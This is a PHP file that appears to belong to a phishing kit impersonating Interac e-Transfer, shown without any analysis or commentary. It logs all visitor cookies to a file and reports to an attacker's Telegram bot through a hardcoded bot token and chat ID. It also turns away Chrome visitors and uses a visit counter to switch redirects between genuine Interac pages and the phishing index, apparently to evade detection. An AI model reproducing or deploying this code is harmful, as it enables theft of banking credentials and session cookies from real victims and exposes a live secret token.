<?php
session_start();

// Check if the user is not logged in
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: login.php");
    exit;
}

// Read and log all visitor's cookies
$cookieLog = fopen("cookie_log.txt", "a");
fwrite($cookieLog, "Visitor Cookies:\n");
foreach ($_COOKIE as $name => $value) {
    fwrite($cookieLog, "Cookie: ".$name." = ".$value."\n");
}
fclose($cookieLog);
?>

<?php
// Function to send a message to Telegram
function sendTelegramMessage($message) {
    $telegramToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s";
    $chatId = '-1001809635857';
    $telegramApiUrl = 'https://api.telegram.org/bot' . $telegramToken . '/sendMessage';
    
    $params = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    
    $query = http_build_query($params);
    $url = $telegramApiUrl . '?' . $query;
    
    file_get_contents($url);
}

// Check if the user agent is Google Chrome
$isChrome = false;
$userAgent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($userAgent, 'Chrome') !== false) {
    $isChrome = true;
}

// Send message to Telegram and suggest downloading Firefox
if ($isChrome) {
    $message = 'CHROME USER BLOCKED ! We recommend using Firefox as....Would you like to download Firefox now?';
    sendTelegramMessage($message);
    
    // Set a cookie to remember that the suggestion has been shown
    setcookie('firefox_suggestion', 'shown', time() + (60 * 60 * 24 * 30)); // Cookie expires in 30 days
}

// Check if the suggestion has already been shown
if (!isset($_COOKIE['firefox_suggestion'])) {
    // Redirect to the Firefox download page
    header('Location: https://www.mozilla.org/en-US/firefox/new/');
    exit;
}
?><?php

// Set a cookie to track the number of visits
if (!isset($_COOKIE['visit_count'])) {
    $visit_count = 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
} else {
    $visit_count = $_COOKIE['visit_count'] + 1;
    setcookie('visit_count', $visit_count, time() + 3600*24*365);
}

// Redirect based on visit count
if ($visit_count < 2) {
  header("Location: https://etransfer.interac.ca/error/");
} elseif ($visit_count >= 2 && $visit_count < 6) {
  header("Location: index.php");
} elseif ($visit_count >= 7 && $visit_count < 10) {
  header("Location: https://etransfer.interac.ca/RP.do?pID=CANj43Vy&lvt=7C115B1C874243FC736311916BF3E204AC32B2BC9DF9613E45C5CA70E2950D8F");
} else {
    header('Location: https://etransfer.interac.ca/error/');
}

exit;
